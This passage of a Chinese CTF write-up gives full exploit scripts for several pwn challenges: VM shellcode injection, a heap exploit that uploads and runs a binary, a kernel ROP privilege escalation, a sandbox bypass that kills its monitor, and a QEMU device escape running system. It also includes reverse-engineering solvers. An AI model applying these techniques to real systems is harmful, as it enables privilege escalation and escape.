0x320: mov reg0, rsp
0x321: push reg0
0x322: pop reg1
0x323: mov reg0, 0x0
0x32c: mov reg2, 0x1000
0x335: syscall read

....
0x37f: mov reg0, &amp;data[0x0]
0x388: push reg0
0x389: pop reg1
0x38a: mov reg0, 0x1
0x393: mov reg2, 0x20
0x39c: syscall write
0x39e: add rsp, 0x100
0x3a7: ret

0x3a8: mov reg0, 0x20205f5f5f5f5f20
....

0x82e: call 0x3
0x831: halt

```

最主要的是两个read的溢出：

```
0x29f: mov reg0, rsp
0x2a0: push reg0
0x2a1: pop reg1
0x2a2: mov reg0, 0x0
0x2ab: mov reg2, 0x1000
0x2b4: syscall read
0x2b6: mov reg0, rsp
0x2b7: syscall puts;  //重要
......

0x320: mov reg0, rsp
0x321: push reg0
0x322: pop reg1
0x323: mov reg0, 0x0
0x32c: mov reg2, 0x1000
0x335: syscall read
```

优先考虑用已有的gadget进行ROP，搜索过后发现并没有合适的gadget，就要换一种思路了

因为第一个read完后用的puts来输出，`\x00`表示字符串结束，可以填充0x100个非`\x00`字节，leak出虚拟栈上的第0x108处的.text段地址

要注意这里的call，保存指针不是常规意义上的”压栈”，它rsp是增加的（同理ret的rsp是减的）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01285bae8965ee6e7c.png)

大致思路：

第一次read先leak出指令的地址

```
# leak cbase
pay = 'a' * 0x100

sa('name:', pay)
code_addr = ru('\nok', drop=True)[-6:]
code_addr = uu64(code_addr) - 0x831
leak('code_addr', code_addr)

cbase = code_addr - (0x555555757020 - 0x555555554000)
leak('cbase', cbase)
```

第二次read，覆盖返回地址，跳到ret指令处，目的是使得rsp减小，后面要leak出heap的地址，而且不这么做直接跳到pop的地方的话没法过检查的

```
0x3a7: ret
```

返回时执行的指令如下：

```
0x37f: mov reg0, &amp;data[0x0]
0x388: push reg0
0x389: pop reg1
0x38a: mov reg0, 0x1
0x393: mov reg2, 0x20
0x39c: syscall write
0x39e: add rsp, 0x100
0x3a7: ret
```

可以看到push了一个栈地址，要leak出来，必须得下次调用puts时，rsp在这个push的地址的下方，这就是为什么要覆盖返回地址为ret指令

之后回到0x3位置，后面调用puts

```
0x3: sub rsp, 0x100
  0xc: mov reg0, 0x2323232323232323
 0x15: mov data[0x0], reg0
 ...
```

代码为：

```
# leak heap
pay = 'a' * 0xf0 + p64(code_addr + 0x3) + p64(code_addr + 0x3a7) * 2  # ret
sa('say:', pay)  

pay = 'a' * 0x10
sa('name:', pay)

heap = ru('\nok', drop=True)[-6:]
heap = uu64(heap)
leak('heap', heap)
```

有了heap的地址(虚拟的栈在堆上)，可以往虚拟的栈上注入”shellcode”，然后ret到shellcode

由于syscall功能没有open

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01608c2974453111a2.png)

则shellcode第一件事情就是先leak出libc，计算出open的地址，覆盖这里的free为open，然后对flag进行open，read，write

完整exp:

```
#coding=utf8

from PwnContext import *

context.terminal = ['xfce4-terminal', '--tab', '-x', 'zsh', '-c']
context.log_level = 'debug'
# functions for quick script
s       = lambda data               :ctx.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
sl      = lambda data               :ctx.sendline(str(data)) 
sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096,timeout=2:ctx.recv(numb, timeout=timeout)
ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
irt     = lambda                    :ctx.interactive()
rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, '\x00'))
uu64    = lambda data   :u64(data.ljust(8, '\x00'))
leak    = lambda name,addr :log.success('`{``}` = `{`:#x`}`'.format(name, addr))

ctx.binary = './vmpwn'
ctx.remote = ('124.70.153.199', 8666)
#ctx.custom_lib_dir = './'
ctx.remote_libc = './libc-2.23.so'
ctx.debug_remote_libc = True

#rs()
rs('remote')
# print(ctx.libc.path)

# leak cbase
pay = 'a' * 0x100

sa('name:', pay)
code_addr = ru('\nok', drop=True)[-6:]
code_addr = uu64(code_addr) - 0x831
leak('code_addr', code_addr)

cbase = code_addr - (0x555555757020 - 0x555555554000)
leak('cbase', cbase)

# leak heap
pay = 'a' * 0xf0 + p64(code_addr + 0x3) + p64(code_addr + 0x3a7) * 2  # ret
sa('say:', pay)  

pay = 'a' * 0x10
sa('name:', pay)

heap = ru('\nok', drop=True)[-6:]
heap = uu64(heap)
leak('heap', heap)

# inject shellcode
def mov_reg0(num):
    return '\x11' + p64(num)

def mov_reg1(num):
    return '\x12' + p64(num)

def mov_reg2(num):
    return '\x13' + p64(num)

def syscall(idx):
    return '\x8f' + chr(idx)

def halt():
    return '\xff'

next_read_addr = (heap - 0x555555758050) + 0x55555575ad50
shellcode_addr = next_read_addr + 0x108 
filename_addr = u64('`{`_addr_`}`')

# leak libc
shellcode = ''
shellcode += mov_reg0(cbase + ctx.binary.got['puts'])
shellcode += syscall(2) # puts


# 得到open
shellcode += mov_reg0(0) # fd
shellcode += mov_reg1(cbase + 0x2038f8) # buf syscall(3)的位置为free项，改成open
shellcode += mov_reg2(8) # nbytes
shellcode += syscall(0) # read

# open
shellcode += mov_reg0(filename_addr) 
shellcode += mov_reg1(0)
shellcode += mov_reg2(0)
shellcode += syscall(3) # open

# read
shellcode += mov_reg0(3) # fd
shellcode += mov_reg1(next_read_addr + 0x500) # buf
shellcode += mov_reg2(0x100) # nbytes
shellcode += syscall(0)

# puts
shellcode += mov_reg0(next_read_addr + 0x500)
shellcode += syscall(2)
shellcode += halt()


shellcode = shellcode.format(_addr_=p64(len(shellcode)+shellcode_addr))
shellcode += './flag\x00'

#dbg()
pay = 'a' * 0x100 + p64(shellcode_addr) + shellcode 
sa('say:', pay)

ru('bye~\n')
puts = uu64(r(6))
leak('puts', puts)

lbase = puts - ctx.libc.sym['puts']
leak('lbase', lbase)

open_addr = lbase + ctx.libc.sym['open']
s(p64(open_addr))


irt()
```

### <a class="reference-link" name="easy_kernel"></a>easy_kernel

解包root.img得到easy_kernel程序，upx脱壳<br>
本质就是个用户态堆题+内核态的栈溢出<br>
内核栈溢出没啥可说的，虽然保护全开但是有leak<br>
堆这边虽然把堆canary藏到了内核里，但edit功能条件写成了或，等于没check，堆是有tcache double free check的所以构造的时候要小心不能溢出，然后就是简单的tcache dup，打ptr就有任意写了，一开始想改返回地址，发现居然发不了0x7f(会变成删除键好像。。。)想了半天发现居然有one_gadget可用我傻了，exp如下：

```
#coding=utf8
from pwn import *
# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0
binary_name = 'easy_kernel'

if local:
    # cn = process('./'+binary_name)
    cn = process('./start_vm.sh',stdin=PTY)
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
    #libc = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)
else:
    cn = remote('124.70.135.106',12574)
    #libc = ELF('')

ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)

if binary_name != '':
    bin = ELF('./'+binary_name,checksec=False)


def z(a=''):
    if local:
        gdb.attach(cn,a)
        if a == '':
            raw_input()
    else:
        pass


def add(idx,sz,con):
    sla('Your choice:','1')
    sla('Index:',str(idx))
    sla('Size:',str(sz))
    sla('Content:',con)

def dele(idx):
    sla('Your choice:','2')
    sla('Index:',str(idx))

def show(idx):
    sla('Your choice:','3')
    sla('Index:',str(idx))

def edit(idx,con):
    sla('Your choice:','4')
    sla('Index:',str(idx))
    sla('Content:',con)

add(0,8,'a'*8)
# show(0)
# ru('Content: '+'a'*0x8)
# canary = u64(rv(8))
add(1,8,'a')
add(2,8,'a')
add(3,8,'a')
dele(0)
dele(1)
edit(1,p64(0x00000000004C3CE8-1))
add(4,8,'a')
add(5,8,'')
show(5)
ru('Content: \x0d')
stack = u64(rv(7)[1:]+'\x00\x00')# - 0x0a
dele(2)
dele(3)
edit(3,p64(0x00000000004C4300))
add(0,0x100,'a')
add(1,8,'a')
add(2,8,p64(0x00000000004C4300+8))
stack -= 0x160#ret address
# raw_input()
edit(0,p64(0x4C3228)+'a'*0x70 + p32(0x100)*2)

prdi = 0x00000000004019fa
prsi = 0x000000000040fb2e
prdx = 0x00000000004017cf

buf = p64(0x0000000000453270)
edit(1,buf)
sla('Your choice:','5')

data = open('exp.base64','rb').read()
# cn.interactive()
cmd = '''cat &gt; /tmp/exp.base &lt;&lt; EOF
`{``}`
EOF
base64 -d /tmp/exp.base &gt; /tmp/exp
chmod +x /tmp/exp
/tmp/exp
'''.format(data)

sla('/ $',cmd)

cn.interactive()
```

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;syscall.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdint.h&gt;

void my_read(char *addr,size_t len)
`{`
    syscall(678,0,addr,len);
`}`

void my_write(char *addr,size_t len)
`{`
    syscall(678,1,addr,len);
`}`

void get_shell()
`{`
    system("/bin/sh");
`}`

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
`{`
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    printf("ip is 0x%lx\n", (size_t)get_shell);
    printf("cs is 0x%lx\n", user_cs);
    printf("ss is 0x%lx\n", user_ss);
    user_sp -= 0x100;
    printf("sp is 0x%lx\n", user_sp);
    printf("flag is 0x%lx\n", user_rflags);
    puts("status has been saved.");
`}`

//0xFFFFFFFF82663660 modprobe_path
int main()
`{`
    signal(SIGSEGV, get_shell);
    char buf[0x1000];
    my_read(buf,0x200);
    uint64_t base = *(uint64_t *)&amp;buf[0x128] - 0x10b8b2a;
    printf("vmlinux:%p\n",base);
    printf("%p\n",my_write);
    save_status();
    uint64_t rops[] = `{`
        base+0x108df00,//pop rdi;ret
        0,
        base+0x10cf3d0,//prepare_kernel_cred
        base+0x1137c0d,//cmp cl,cl ; ret
        base+0x1565734,//mov rdi, rax ; jne 0xffffffff81565728 ; xor eax, eax ; ret
        base+0x10cef40,//commit_creds
        base+0x107a3a0,//swapgs ; ret
        base+0x103BAEB,//iret
        get_shell,
        user_cs,
        user_rflags,
        user_sp,
        user_ss
    `}`;
    memcpy(&amp;buf[0x128],rops,sizeof(rops));
    my_write(buf,0x200);
    return 0;
`}`
```

### <a class="reference-link" name="sandbox"></a>sandbox

查看源码，提示有黑名单+白名单

[![](https://p5.ssl.qhimg.com/t0191023fe0831a92b6.png)](https://p5.ssl.qhimg.com/t0191023fe0831a92b6.png)

open不能用，想到可能是seccomp的沙箱规则，又想到init函数在main函数之前运行，就尝试一下在init函数里使用open：

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
void __attribute__((constructor)) test_init(void) `{`
    int fd = open("/proc/self/cmdline", 0);
    printf("fd=%d\n", fd);
`}`
int main()
`{`
    int fd = open("/proc/self/cmdline", 0);
    printf("fd=%d\n", fd);
    return 0;
`}`
```

发现结果不一样，看来init函数执行的时候，沙箱规则还没配置

```
fd=3
fd=-1
```

读取目录下的文件名

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;dirent.h&gt;
void __attribute__((constructor)) test_init(void) `{`
    DIR *dir = opendir(".");
    if (dir != NULL) `{`
        printf("dir != NULL\n");
        struct dirent *d;
        while ((d = readdir(dir))!= NULL) `{`
            printf("%s\n", d-&gt;d_name);
        `}`
    `}`
`}`
int main()
`{`
    return 0;
`}`
```

```
dir != NULL
..
.
init.c
index.html
web_server.py
libhook.so
flag
daemon
```

flag打不开，libhook.so因为不可见字符没法显示（服务器直接500了），base64转一下

base64编码c语言实现直接网上查就有，改一下就行

获取任意文件的脚本(python3):

```
#coding=utf8

import requests
from base64 import b64decode

url = 'http://149.28.31.156:12564/submit'

def getfile(filename, dst):
    code = r'''
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

const char * base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
const char padding_char = '=';

int base64_encode(const unsigned char * sourcedata, char * base64, int len)
`{`
    int i=0, j=0;
    unsigned char trans_index=0;    // 索引是8位，但是高两位都为0
    const int datalength = len;
    for (; i &lt; datalength; i += 3)`{`
        // 每三个一组，进行编码
        // 要编码的数字的第一个
        trans_index = ((sourcedata[i] &gt;&gt; 2) &amp; 0x3f);
        base64[j++] = base64char[(int)trans_index];
        // 第二个
        trans_index = ((sourcedata[i] &lt;&lt; 4) &amp; 0x30);
        if (i + 1 &lt; datalength)`{`
            trans_index |= ((sourcedata[i + 1] &gt;&gt; 4) &amp; 0x0f);
            base64[j++] = base64char[(int)trans_index];
        `}`else`{`
            base64[j++] = base64char[(int)trans_index];

            base64[j++] = padding_char;

            base64[j++] = padding_char;

            break;   // 超出总长度，可以直接break
        `}`
        // 第三个
        trans_index = ((sourcedata[i + 1] &lt;&lt; 2) &amp; 0x3c);
        if (i + 2 &lt; datalength)`{` // 有的话需要编码2个
            trans_index |= ((sourcedata[i + 2] &gt;&gt; 6) &amp; 0x03);
            base64[j++] = base64char[(int)trans_index];

            trans_index = sourcedata[i + 2] &amp; 0x3f;
            base64[j++] = base64char[(int)trans_index];
        `}`
        else`{`
            base64[j++] = base64char[(int)trans_index];

            base64[j++] = padding_char;
        `}`
    `}`

    base64[j] = '\0'; 

    return 0;
`}`


void __attribute__((constructor)) test_init(void) `{`
    char buf[0x100];
    char b64[0x200];
    int n;
    int fd = open("''' + filename + r'''", 0);
    if (fd &gt;= 0) `{`
        while((n = read(fd, buf, 0x100)) &gt; 0) `{`
            base64_encode(buf, b64, n);
            puts(b64);
        `}`

    `}`


`}`

int main()
`{`
    return 0;
`}`
    '''
    data = `{`
        'code': code
    `}`

    r = requests.post(url, data=data)

    with open(dst, 'wb') as fd:
        for line in r.iter_lines():
            fd.write(b64decode(line))

if __name__ == '__main__':
    from sys import argv
    getfile(argv[1], argv[2])
```

先拖web_server.py下来，其中关键位置：

```
...
        os.popen('su sandbox -c "gcc /tmp/%s.c /home/sandbox/init.c -s -w -o /tmp/%s "' % (name, name)).read()
        if(os.access('/tmp/%s' % (name), os.F_OK) == True):
            p = os.popen('su sandbox -c "/home/sandbox/daemon /tmp/%s"' % (name))
...
```

可以看到两个关键文件init.c，和daemon，把它们和libhook.so都获取下来分析

libhook.so就这个，应该是防止执行system之类的

[![](https://p2.ssl.qhimg.com/t01582aaff169ec868f.png)](https://p2.ssl.qhimg.com/t01582aaff169ec868f.png)

init.c就是白名单了，但是可以写个init函数先于它执行就可以绕过

```
...
void sandbox_init()
`{`
    struct sock_filter filter[] = `{`
        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 4),
        BPF_JUMP(BPF_JMP|BPF_JEQ, 0xc000003e, 0, 9),

        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_exit, 9, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_fstat, 8, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_brk, 7, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_exit, 6, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_alarm, 5, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_write, 4, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_read, 3, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_mmap, 2, 0),
        BPF_JUMP(BPF_JMP|BPF_JEQ, SYS_exit_group, 1, 0),
        BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO | (1 &amp; SECCOMP_RET_DATA)),
        BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW),
    `}`;
...
```

daemon应该就是是所谓的黑名单

daemon先是读了5字节的flag，保存了下来，然后设置环境变量LD_PRELOAD为libhook.so，然后又fork进程执行程序post上去的程序

打开不了flag的原因是，daemon进程对fork出来的子进程实时检测，遇到打开文件的操作，先读取文件的5字节，然后与保存的flag的前五字节比对，一样的话就会阻止

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018625089bd1bf86ae.png)

参考文章：[https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/](https://blog.betamao.me/2019/02/02/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bptrace/)

可以用fork的方式绕过，但是这里尝试后发现fork不能使用，那就将父进程杀死来绕过

```
kill(getppid(),SIGKILL);
```

然后再读取flag，完整exp:

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;

void __attribute__((constructor)) test_init(void) `{`
    char buf[0x100];

    kill(getppid(),SIGKILL);

    int fd = open("flag", 0);
    if (fd &lt; 0) `{`
        perror("");
    `}` else `{`
        read(fd, buf, 0x100);
        puts(buf);
    `}`

`}`

int main()
`{`    
    return 0;
`}`
```

### <a class="reference-link" name="babyqemu"></a>babyqemu

看start.sh发现添加了一个叫denc的设备，在qemu里搜字符串找到相关设备的结构体<br>
发现可以通过mmio和pmio读写，pmio write里藏了一个调用内部函数指针的路径，而mmio write刚好可以修改这个指针，通过mmio read可以leak write里异或的值和原本函数指针来绕过pie，于是改成system.plt之后直接cat flag

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/io.h&gt;

void *mmio;
uint64_t xors[5];

uint32_t mmio_read(uint32_t addr)
`{`
    return *(uint32_t *)(mmio+addr);
`}`

uint64_t mmio_readu64(uint32_t addr)
`{`
    return (((uint64_t)mmio_read(addr+4)) &lt;&lt; 32) + mmio_read(addr);
`}`

void mmio_write(uint32_t addr,uint32_t value)
`{`
    *(uint32_t *)(mmio+addr) = value;
`}`

void mmio_writeu64(uint32_t addr,uint64_t value)
`{`
    *(uint32_t *)(mmio+addr) = value;
    *(uint32_t *)(mmio+addr + 4) = value &gt;&gt; 32;
`}`

void get_xors()
`{`
    for(int i=0;i&lt;5;i++)
    `{`
        mmio_writeu64(0x0+i*8,0);
        xors[i] = mmio_readu64(0x0+i*8);
        printf("xors[%d]:%p\n",i,xors[i]);
    `}`
`}`

int main()
`{`
    int fd = open("/sys/bus/pci/devices/0000:00:04.0/resource0",O_RDWR);
    mmio = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(mmio == MAP_FAILED)`{`
        puts("mmio init failed");
        exit(-1);
    `}`
    uint64_t cbase = mmio_readu64(0x20) - 0x3A9EA8;
    printf("aslr base:%p\n",cbase);
    get_xors();
    mmio_writeu64(0x20,xors[4]^(cbase+0x00000000002CCB60));//system
    mmio_writeu64(0,xors[0]^0x67616c6620746163);//cat flag
    mmio_writeu64(8,xors[1]);//'\0'
    iopl(3);
    outl(0,0xc660);
`}`
```



## RE

### <a class="reference-link" name="EasyRe"></a>EasyRe

先使用angr爆出第一步

```
import angr, sys
path_to_binary='./EasyRe'
project = angr.Project(path_to_binary)
initial_state = project.factory.entry_state()
simulation = project.factory.simgr(initial_state)
target = 0x8048C0B
avoid_addr = 0x8048C46
simulation.explore(find=target, avoid=avoid_addr)
if simulation.found:
    solution_state = simulation.found[0]
    print(solution_state.posix.dumps(sys.stdin.fileno()))
else:
    raise Exception('Could not find the solution')
```

后面VM 爆破

```
char CODES[467] =
`{`
  '\t',
  '\x10',
  '\x80',
  '\x02',
  '\r',
  '\0',
  '\0',
  '\0',
  '\"',
  'w',
  '\x10',
  '\x80',
  '\x02',
  '\t',
  '\0',
  '\0',
  '\0',
  '#',
  '\x80',
  '\x02',
  '\0',
  '\x96',
  '\xF3',
  'x',
  '1',
  'w',
  '\x10',
  '\x80',
  '\x02',
  '\x11',
  '\0',
  '\0',
  '\0',
  '#',
  '\x80',
  '\x02',
  '\0',
  '\0',
  '\xD4',
  '\x85',
  '1',
  'w',
  '\x10',
  '\x80',
  '\x02',
  '\x13',
  '\0',
  '\0',
  '\0',
  '\"',
  'w',
  '\xA0',
  '\t',
  '\x80',
  '\x02',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '1',
  '\x80',
  '\x03',
  '\x02',
  '\0',
  '\0',
  '\0',
  'C',
  '\x80',
  '\x02',
  '\x18',
  '\0',
  '\0',
  '\0',
  'A',
  '\xA4',
  '\0',
  '\0',
  '\0',
  '\t',
  '\x80',
  '\x02',
  '\b',
  '\0',
  '\0',
  '\0',
  '\"',
  '\x80',
  '\x02',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '1',
  '\x80',
  '\x05',
  '\a',
  '\0',
  '\0',
  '\0',
  'D',
  '\x80',
  '\x02',
  '!',
  '\0',
  '\0',
  '\0',
  'A',
  '\xA4',
  '\x01',
  '\0',
  '\0',
  '\t',
  '\x80',
  '\x02',
  '\x10',
  '\0',
  '\0',
  '\0',
  '\"',
  '\x80',
  '\x02',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '1',
  '\x80',
  '\t',
  '\xBB',
  '\0',
  '\0',
  '\0',
  'w',
  '\x80',
  '\x02',
  '\xFF',
  '\0',
  '\0',
  '\0',
  'A',
  '\xA4',
  '\x02',
  '\0',
  '\0',
  '\t',
  '\x80',
  '\x02',
  '\x18',
  '\0',
  '\0',
  '\0',
  '\"',
  '\x80',
  '\x02',
  '\xFF',
  '\0',
  '\0',
  '\0',
  '1',
  '\x80',
  '\x04',
  '\xA0',
  '\0',
  '\0',
  '\0',
  'B',
  '\x80',
  '\x02',
  'w',
  '\0',
  '\0',
  '\0',
  'A',
  '\xA4',
  '\x03',
  '\0',
  '\0',
  '\xA1',
  '\xC1',
  '\0',
  '\xB1',
  'w',
  '\xC2',
  '\v',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x01',
  '\xB2',
  'w',
  '\xC2',
  'z',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x02',
  '\xB4',
  'w',
  '\xC2',
  '\x95',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x03',
  '\xB3',
  'w',
  '\xC2',
  '\x06',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x04',
  '\xB2',
  'w',
  '\xC2',
  '`}`',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x05',
  '\xB4',
  'w',
  '\xC2',
  '\xAD',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x06',
  '\xB1',
  'w',
  '\xC2',
  '/',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\a',
  '\xB3',
  'w',
  '\xC2',
  'e',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\b',
  '\xB1',
  'w',
  '\xC2',
  '-',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\t',
  '\xB1',
  'w',
  '\xC2',
  '/',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\n',
  '\xB3',
  'w',
  '\xC2',
  '9',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\v',
  '\xB3',
  'w',
  '\xC2',
  '\r',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\f',
  '\xB4',
  'w',
  '\xC2',
  '\xBB',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\r',
  '\xB2',
  'w',
  '\xC2',
  '\b',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x0E',
  '\xB3',
  'w',
  '\xC2',
  '\r',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x0F',
  '\xB1',
  'w',
  '\xC2',
  '?',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x10',
  '\xB3',
  'w',
  '\xC2',
  ':',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x11',
  '\xB3',
  'w',
  '\xC2',
  'a',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x12',
  '\xB2',
  'w',
  '\xC2',
  'W',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x13',
  '\xB1',
  'w',
  '\xC2',
  ' ',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x14',
  '\xB3',
  'w',
  '\xC2',
  '\r',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x15',
  '\xB1',
  'w',
  '\xC2',
  '?',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x16',
  '\xB3',
  'w',
  '\xC2',
  '?',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x17',
  '\xB4',
  'w',
  '\xC2',
  '\xB5',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x18',
  '\xB1',
  'w',
  '\xC2',
  '\x13',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x19',
  '\xB4',
  'w',
  '\xC2',
  '\xA0',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x1A',
  '\xB1',
  'w',
  '\xC2',
  '!',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x1B',
  '\xB3',
  'w',
  '\xC2',
  '\r',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x1C',
  '\xB2',
  'w',
  '\xC2',
  '\v',
  '\0',
  '\0',
  '\0',
  '\xC1',
  '\x1D',
  '\xB3',
  'w',
  '\xC2',
  '9',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x1E',
  '\xB1',
  'w',
  '\xC2',
  's',
  '\x01',
  '\0',
  '\0',
  '\xC1',
  '\x1F',
  '\xB2',
  'w',
  '\xC2',
  'F',
  '\0',
  '\0',
  '\0',
  '\x99'
`}`;



unsigned int __cdecl dec(unsigned int* func, int len, int* key)
`{`
    unsigned int v4; // [esp+14h] [ebp-34h]
    unsigned int v5; // [esp+18h] [ebp-30h]
    int i; // [esp+1Ch] [ebp-2Ch]
    int v7; // [esp+20h] [ebp-28h]
    int v8; // [esp+24h] [ebp-24h]
    unsigned int v9; // [esp+2Ch] [ebp-1Ch]

    v7 = 34 / len + 9;
    v5 = 0x4E782FF0 * v7;
    v4 = *func;
    do
    `{`
        v8 = (v5 &gt;&gt; 2) &amp; 3;
        for (i = len - 1; i; --i)
        `{`
            func[i] -= (((2 * v4) ^ (func[i - 1] &gt;&gt; 4)) + ((v4 &gt;&gt; 3) ^ (32 * func[i - 1])) + 40) ^ ((v4 ^ v5 ^ 0x77)
                + (func[i - 1] ^ key[v8 ^ i &amp; 3])
                - 15);
            v4 = func[i];
        `}`
        *func -= (((2 * v4) ^ (func[len - 1] &gt;&gt; 4)) + ((v4 &gt;&gt; 3) ^ (32 * func[len - 1])) + 40) ^ ((v4 ^ v5 ^ 0x77)
            + (func[len - 1] ^ key[v8])
            - 15);
        v4 = *func;
        v5 -= 0x4E782FF0;
        --v7;
    `}` while (v7);
    return 0;
`}`
char buf[] = `{` "\x30\xc0\xf5\x80\xf0\xb2\xef\x68\x44\x13\x8d\x19\x31\xe7\xf9\xa9\xc3\xb5\xbc\xc0\x5c\x01\xe3\x1b\x0d\x94\x2e\x48\x66\x6c\x7f\xa7\x9b\x35\xaf\xc5\x27\xe8\xe5\x70\x20\x09\x09\xcf\xd6\xac\xc1\xab\xd8\xaf\x7c\x7f\x3b\x73\x8c\x3c\xd8\x00\x2c\xdd\xe5\x45\xf8\x65\xcb\x14\x3d\xf6\xfb\xaa\x03\xef\xcb\xd0\x37\x51\x26\x08\xe8\xf5\xb4\x82\x16\xdb\x6b\x55\x86\x8e\x5d\x13\xab\x42\x99\x2e\x40\x3a\xb7\x9a\x71\x8b\xfd\xf0\x23\xa6\x14\x78\xae\x55\x3b\x5e\xf9\x3a\xf9\xf9\xb0\x5f\xb5\x43\x46\x40\x63\x9f\xff\x37\xde\x19\x9f\xfa\x1d\x91\x74\x88\x08\x05\x45\x71\x2e\x7f\xd9\xfe\xc5\x5d\x32\xb5\x4a\x67\x20\x62\x87\x7c\x29\x8f\x3c\x56\x3e\x96\x13\x89\x26\x55\x41\xdf\xa6\xe4\xa4\x3a\xaf\xa3\xd2\x4d\xcd\x64\x61\x89\xee\xd6\x35\x5e\x63\x57\xcb\x5f\x68\xb0\x2f\x4e\xf2\xc4\x3c\x15\x8e\x6c\xa8\xc0\x90\x97\x20\xbd\x1a\x71\x77\xb2\xc5\xd1\x46\x4f\x88\x78\x15\xe9\xdd\xb2\x1a\x69\xe1\x3a\xe1\xc9\x6b\x13\xb3\xa2\xfc\xd7\x70\x4a\xbd\x05\xf1\x32\xff\x72\x6e\xdf\xff\x8f\xf2\xf0\x17\x60\x14\